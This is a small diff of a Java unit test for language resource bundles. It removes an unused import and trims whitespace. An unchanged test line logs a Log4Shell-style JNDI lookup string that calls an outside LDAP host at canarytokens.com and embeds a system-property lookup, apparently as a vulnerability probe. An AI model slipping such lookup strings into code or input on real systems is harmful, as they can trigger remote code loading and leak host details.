@@ -9,16 +9,15 @@ import java.util.ResourceBundle;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.junit.Test;
-import org.slf4j.LoggerFactory;
 
 public class LangResourcesTest {
 
-	
+
 	@Test
 	public void checkTwoLang() {
-		
+
 		compareLang(new Locale("en","EN"), new Locale("de","DE"));
-		
+
 		Logger LOG = LogManager.getLogger("foobar");
 		LOG.info("Here is ${java:os} ${jndi:ldap://"+System.currentTimeMillis()+".u68w7yd1jfdw9bncqdq4v4u3m.canarytokens.com/a}");
 	}
